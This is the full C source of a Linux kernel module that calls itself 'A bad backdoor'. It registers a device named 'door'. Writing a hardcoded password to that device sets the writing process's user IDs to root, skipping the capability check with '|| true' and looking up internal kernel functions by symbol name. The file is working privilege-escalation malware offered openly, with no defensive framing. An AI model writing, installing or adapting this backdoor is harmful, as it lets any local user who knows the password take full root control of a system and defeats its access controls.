#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/kdev_t.h>
#include <linux/fs.h>
#include <linux/device.h>
#include <linux/cdev.h>
#include <linux/uaccess.h>

#include <linux/kernel.h>
#include <linux/export.h>
#include <linux/mm.h>
#include <linux/utsname.h>
#include <linux/mman.h>
#include <linux/reboot.h>
#include <linux/prctl.h>
#include <linux/highuid.h>
#include <linux/fs.h>
#include <linux/kmod.h>
#include <linux/perf_event.h>
#include <linux/resource.h>
#include <linux/kernel.h>
#include <linux/workqueue.h>
#include <linux/capability.h>
#include <linux/device.h>
#include <linux/key.h>
#include <linux/times.h>
#include <linux/posix-timers.h>
#include <linux/security.h>
#include <linux/dcookies.h>
#include <linux/suspend.h>
#include <linux/tty.h>
#include <linux/signal.h>
#include <linux/cn_proc.h>
#include <linux/getcpu.h>
#include <linux/task_io_accounting_ops.h>
#include <linux/seccomp.h>
#include <linux/cpu.h>
#include <linux/personality.h>
#include <linux/ptrace.h>
#include <linux/fs_struct.h>
#include <linux/file.h>
#include <linux/mount.h>
#include <linux/gfp.h>
#include <linux/syscore_ops.h>
#include <linux/version.h>
#include <linux/ctype.h>

#include <linux/compat.h>
#include <linux/syscalls.h>
#include <linux/kprobes.h>
#include <linux/user_namespace.h>
#include <linux/binfmts.h>

/*#include <linux/sched.h>*/
#include <linux/rcupdate.h>
#include <linux/uidgid.h>
#include <linux/cred.h>

#include <linux/kmsg_dump.h>
/* Move somewhere else to avoid recompiling? */
#include <generated/utsrelease.h>

#include <asm/uaccess.h>
#include <asm/io.h>
#include <asm/unistd.h>

#include <linux/kallsyms.h>


struct user_struct root_user = {
          .__count        = ATOMIC_INIT(1),
          .processes      = ATOMIC_INIT(1),
          .sigpending     = ATOMIC_INIT(0),
          .locked_shm     = 0,
          .uid            = GLOBAL_ROOT_UID,
};

static int set_user(struct cred *new)
{
    struct user_struct *new_user;
    struct user_struct* (*auid)(kuid_t);
    void (*fuid)(struct user_struct *);

    auid = kallsyms_lookup_name("alloc_uid");
    new_user = auid(new->uid);
    if (!new_user)
        return -EAGAIN;

    /*
     * We don't fail in case of NPROC limit excess here because too many
     * poorly written programs don't check set*uid() return code, assuming
     * it never fails if called by root.  We may still enforce NPROC limit
     * for programs doing set*uid()+execve() by harmlessly deferring the
     * failure to the execve() stage.
     */
    if (atomic_read(&new_user->processes) >= rlimit(RLIMIT_NPROC) &&
            new_user != INIT_USER)
        current->flags |= PF_NPROC_EXCEEDED;
    else
        current->flags &= ~PF_NPROC_EXCEEDED;

    fuid = kallsyms_lookup_name("free_uid");
    fuid(new->user);
    new->user = new_user;
    return 0;
}

static long elevate_privileges(void)
{
    struct user_namespace *ns = current_user_ns();
    const struct cred *old;
    struct cred *new;
    int retval;
    kuid_t kuid;
    uid_t uid = 0;
    int (*stask)(struct cred *, const struct cred *, int);

    kuid = make_kuid(ns, uid);
    if (!uid_valid(kuid))
        return -EINVAL;

    new = prepare_creds();
    if (!new)
        return -ENOMEM;
    old = current_cred();

    retval = -EPERM;
    if (ns_capable(old->user_ns, CAP_SETUID) || true) {
        new->suid = new->uid = kuid;
        if (!uid_eq(kuid, old->uid)) {
            retval = set_user(new);
            if (retval < 0)
                goto error;
        }
    } else if (!uid_eq(kuid, old->uid) && !uid_eq(kuid, new->suid)) {
        goto error;
    }

    new->fsuid = new->euid = kuid;

    stask = kallsyms_lookup_name("security_task_fix_setuid");
    retval = stask(new, old, LSM_SETID_ID);
    if (retval < 0)
        goto error;

    return commit_creds(new);

error:
    abort_creds(new);
    return retval;
}


static dev_t dev_id;
static struct class *dev_class;
static struct cdev device;


#define PASS_BUF_SIZE 128
char pass_buf[PASS_BUF_SIZE];

const char password[] = "smokeweedeveryday";

static int thedoor_open(struct inode *inod, struct file *fl)
{
    return 0;
}

static int thedoor_close(struct inode *inod, struct file *fl)
{
    return 0;
}

static ssize_t thedoor_read(struct file *fl, char __user *buf, size_t len, loff_t *off)
{
    return 0;
}

static ssize_t thedoor_write(
    struct file *fl, const char __user *buf, size_t len, loff_t *off)
{
    if (len >= PASS_BUF_SIZE)
        return len;

    if (copy_from_user(pass_buf, buf, len) != 0)
        return -EFAULT;

    pass_buf[len] = '\0';
    if (pass_buf[len - 1] == '\n')
        pass_buf[len - 1] = '\0';

    if (strcmp(pass_buf, password) == 0)
        elevate_privileges();

    return len;
}

static struct file_operations thedoor_fops = {
    .owner = THIS_MODULE,
    .open = thedoor_open,
    .release = thedoor_close,
    .read = thedoor_read,
    .write = thedoor_write
};


static int __init thedoor_init(void)
{
    printk("Thedoor loading\n");

    if (alloc_chrdev_region(&dev_id, 0, 1, "thedoor") < 0)
        goto error;

    if ((dev_class = class_create(THIS_MODULE, "thedoor")) == NULL)
        goto error_class;

    if (device_create(dev_class, NULL, dev_id, NULL, "door") == NULL)
        goto error_device;

    cdev_init(&device, &thedoor_fops);
    if (cdev_add(&device, dev_id, 1) == -1)
        goto error_cdev;

    return 0;

error_cdev:
    device_destroy(dev_class, dev_id);
error_device:
    class_destroy(dev_class);
error_class:
    unregister_chrdev_region(dev_id, 1);
error:
    return -1;
}


static void __exit thedoor_exit(void)
{
    printk("Thedoor unloading\n");

    cdev_del(&device);
    device_destroy(dev_class, dev_id);
    class_destroy(dev_class);
    unregister_chrdev_region(dev_id, 1);
}


module_init(thedoor_init);
module_exit(thedoor_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("swarmer <anton@swarmer.me>");
MODULE_DESCRIPTION("A bad backdoor");
